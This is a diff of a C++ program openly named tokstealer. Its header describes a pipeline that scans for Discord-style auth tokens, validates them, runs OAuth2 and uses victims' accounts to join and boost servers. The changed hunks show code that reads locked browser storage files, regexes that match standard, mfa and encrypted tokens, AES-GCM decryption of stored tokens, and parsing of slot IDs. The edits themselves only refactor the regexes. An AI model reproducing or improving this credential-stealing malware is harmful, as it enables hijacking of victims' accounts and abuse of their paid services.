@@ -1,5 +1,5 @@
 // tokstealer.cpp
-// Build (MSVC):
+// Build:
 //   cl /std:c++17 /EHsc /O2 /DNDEBUG /MD tokstealer.cpp /link winhttp.lib bcrypt.lib crypt32.lib /MACHINE:X64 /OUT:tokstealer.exe
 // Pipeline: scan tokens -> validate -> OAuth2 -> wait 5s -> check join -> boost
 // 3 workers parallel, max 500 tokens, no file output.
@@ -321,7 +321,7 @@ static std::string aes_gcm_decrypt(const std::string& enc, const std::vector<BYT
 }
 
 // ─────────────────────────────────────────────
-//  FILE READ (bypass browser lock)
+//  FILE READ
 // ─────────────────────────────────────────────
 
 static std::string read_locked_file(const std::string& path) {
@@ -343,7 +343,7 @@ static std::string read_locked_file(const std::string& path) {
 }
 
 // ─────────────────────────────────────────────
-//  TOKEN EXTRACTION
+//  TOKEN EXTRACTION (regex dùng chuỗi escape thường)
 // ─────────────────────────────────────────────
 
 static bool looks_like_real_token(const std::string& tok) {
@@ -369,23 +369,32 @@ static bool looks_like_real_token(const std::string& tok) {
     return true;
 }
 
+static const std::regex& re_std() {
+    static const std::regex re("[A-Za-z0-9_-]{24,26}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27,38}");
+    return re;
+}
+static const std::regex& re_mfa() {
+    static const std::regex re("mfa\\.[A-Za-z0-9_-]{84}");
+    return re;
+}
+static const std::regex& re_enc() {
+    static const std::regex re("dQw4w9WgXcQ:[A-Za-z0-9+/=]+");
+    return re;
+}
+
 static void extract_tokens(const std::string& content,
                            const std::vector<BYTE>& key,
                            std::set<std::string>& out) {
-    static const std::regex re_std(R"([\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38})");
-    static const std::regex re_mfa(R"(mfa\.[\w-]{84})");
-    static const std::regex re_enc(R"(dQw4w9WgXcQ:[A-Za-z0-9+/=]+)");
-
-    for (auto it = std::sregex_iterator(content.begin(), content.end(), re_std);
+    for (auto it = std::sregex_iterator(content.begin(), content.end(), re_std());
          it != std::sregex_iterator(); ++it) {
         if (looks_like_real_token(it->str())) out.insert(it->str());
     }
-    for (auto it = std::sregex_iterator(content.begin(), content.end(), re_mfa);
+    for (auto it = std::sregex_iterator(content.begin(), content.end(), re_mfa());
          it != std::sregex_iterator(); ++it) {
         out.insert(it->str());
     }
     if (!key.empty()) {
-        for (auto it = std::sregex_iterator(content.begin(), content.end(), re_enc);
+        for (auto it = std::sregex_iterator(content.begin(), content.end(), re_enc());
              it != std::sregex_iterator(); ++it) {
             auto dec = aes_gcm_decrypt(it->str(), key);
             if (!dec.empty()) out.insert(dec);
@@ -518,7 +527,7 @@ static std::vector<std::string> get_slot_ids(const std::string& token) {
     std::vector<std::string> ids;
     if (!resp.ok || resp.status != 200) return ids;
 
-    static const std::regex re(R"("id"\s*:\s*"(\d+)")");
+    static const std::regex re("\"id\"\\s*:\\s*\"([0-9]+)\"");
     for (auto it = std::sregex_iterator(resp.body.begin(), resp.body.end(), re);
          it != std::sregex_iterator(); ++it) {
         ids.push_back((*it)[1].str());
